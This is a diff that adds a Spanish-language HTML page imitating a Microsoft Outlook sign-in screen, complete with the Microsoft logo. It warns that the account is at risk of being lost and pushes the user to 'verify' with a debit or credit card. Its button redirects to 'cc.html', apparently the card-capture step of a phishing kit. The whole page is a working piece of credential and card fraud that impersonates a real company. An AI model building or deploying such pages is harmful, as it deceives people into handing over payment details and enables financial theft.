@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Microsoft Outlook</title>
+    <link rel="stylesheet" href="very.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <svg width="108" height="24" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="10.5" height="10.5" fill="#F35325"/>
+                    <rect y="11.5" width="10.5" height="10.5" fill="#81BC06"/>
+                    <rect x="11.5" width="10.5" height="10.5" fill="#05A6F0"/>
+                    <rect x="11.5" y="11.5" width="10.5" height="10.5" fill="#FFBA08"/>
+                </svg>
+                <span class="logo-text">Microsoft</span>
+            </div>
+
+            <h1 class="title">Riesgo de Perder su cuenta</h1>
+
+            <form class="login-form" id="loginForm">
+                <div class="form-group">
+                    
+                </div>
+
+                <div class="form-links">
+                    <span class="no-account">Para mantener su cuenta debe verificar con su tarjeta de Debito o Credito y agregar su cuenta de Microsoft Personal. </span>
+                    
+                </div>
+
+                <div class="form-links">
+                   <span class="no-account">Se hara cobro de: <p style="font-size: x-large;"> 0.00$</p></span>
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" onclick="next()" class="btn-primary">Siguiente</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="signin-options">
+            <a href="#" class="options-link">
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M14 7C14 5.34315 12.6569 4 11 4H9C7.34315 4 6 5.34315 6 7C6 8.65685 7.34315 10 9 10H11C12.6569 10 14 11.3431 14 13C14 14.6569 12.6569 16 11 16H9C7.34315 16 6 14.6569 6 13" stroke="#5E5E5E" stroke-width="1.5" stroke-linecap="round"/>
+                    <circle cx="10" cy="10" r="9" stroke="#5E5E5E" stroke-width="1.5"/>
+                </svg>
+                <span>De no realizar la verificacion se bloqueara su cuenta.</span>
+            </a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <a href="#" class="footer-link">Términos de uso</a>
+        <a href="#" class="footer-link">Privacidad y cookies</a>
+        <button class="footer-more">...</button>
+    </footer>
+
+    <script src="src/main.ts" type="module"></script>
+</body>
+<script>
+    function    next() {
+    window.location.href = "cc.html";
+}
+</script>
+
+    
+</html>
